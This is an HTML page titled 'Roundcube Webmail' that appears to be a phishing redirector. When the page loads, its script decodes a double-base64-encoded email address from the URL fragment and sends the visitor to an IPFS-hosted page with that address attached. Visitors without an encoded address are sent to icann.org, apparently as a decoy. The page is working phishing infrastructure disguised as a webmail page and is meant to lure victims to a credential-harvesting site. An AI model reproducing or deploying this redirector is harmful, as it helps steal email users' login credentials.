<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Roundcube Webmail . . .</title>
    <link
      rel="shortcut icon"
      href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <script>
      function b64DecodeUnicode(str) {
        // Going backwards: from bytestream, to percent-encoding, to original string.
        return decodeURIComponent(
          atob(str)
            .split("")
            .map(function (c) {
              return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
            })
            .join("")
        );
      }

      function redirectPage() {
        var query = window.location.href;
        console.log(query);
        var res = query.split("#");
        var data1 = res[0];
        var data2 = res[1];
        console.log(data1);
        console.log(data2);

        var id = b64DecodeUnicode(data2);
        console.log(id);
        var id2 = b64DecodeUnicode(id);
        console.log(id2);

        //$email64 = base64_encode($email);
        //$email65 = base64_encode($email64);

        if (data2) {
          console.log("true");
          window.location.href =
            "https://gateway.lighthouse.storage/ipfs/bafybeiamrwrm2sgu2oq4upa5sa5xkqlgacte5qxd23kywexline4csl47i#" +
            id;
        } else {
          console.log("false");
          window.location.href = "https://icann.org";
        }
      }

      redirectPage();
    </script>
  </body>
</html>
